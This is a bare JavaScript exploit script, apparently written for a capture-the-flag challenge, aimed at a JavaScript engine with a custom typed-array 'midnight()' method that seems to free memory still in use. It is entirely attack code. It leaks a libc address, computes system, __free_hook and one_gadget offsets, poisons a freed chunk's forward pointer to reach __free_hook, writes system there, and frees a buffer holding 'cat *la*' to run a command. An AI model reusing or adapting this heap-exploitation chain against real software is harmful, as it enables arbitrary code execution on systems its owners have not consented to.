function hex(a) {
    var result = "";
  
    for (var i = 7; i >= 0; i--) {
      result += ('0' + a[i].toString(16)).slice(-2);
    }
  
    return result
  }
  
  function alloc_list(size, chr) {
    var bla = [];
    for (var i = 0; i < size; i++) {
        bla.push(chr);
    }
    return bla;
  }
  
  big_list = alloc_list(0x1000, 0x41);
  big_list_typed = new Uint8Array(big_list);
  big_list_typed.midnight();
  
  libc_leak_str = hex(big_list_typed);
  
  libc_leak = parseInt(libc_leak_str, 16);
  libc_base = libc_leak - 0x1ed350;
  system = libc_base + 0x522c0;
  free_hook = libc_base + 0x1eee48;
  
  one_gadget  = libc_base + 0xe3b31;
  
  
  
  libc_base_str = libc_base.toString(16);
  free_hook_str = free_hook.toString(16);
  system_str = system.toString(16);
  system_upper = parseInt(system_str.substring(0, 4), 16);
  
  console.log(libc_base_str);
  console.log(system_str);
  console.log(free_hook_str);
  
  bin1_list_typed = new Uint8Array(0x1e0);
  
  // free
  bin1_list_typed.midnight();
  
  
  // // overwrite fd (free hook)
  bin1_list_typed[5] = parseInt(free_hook_str.substring(0, 0 + 2), 16);
  bin1_list_typed[4] = parseInt(free_hook_str.substring(2, 2 + 2), 16);
  bin1_list_typed[3] = parseInt(free_hook_str.substring(4, 4 + 2), 16);
  bin1_list_typed[2] = parseInt(free_hook_str.substring(6, 6 + 2), 16);
  bin1_list_typed[1] = parseInt(free_hook_str.substring(8, 8 + 2), 16);
  bin1_list_typed[0] = parseInt(free_hook_str.substring(10, 10 + 2), 16);
  
  random_typed = new Uint32Array(0x78);
  random_typed[1] = 0x2a616c2a;
  random_typed[0] = 0x20746163;
  
  typedArray1 = new Uint32Array(0x78);
  typedArray1[0] = system;
  typedArray1[1] = system_upper;
  
  random_typed.midnight()
  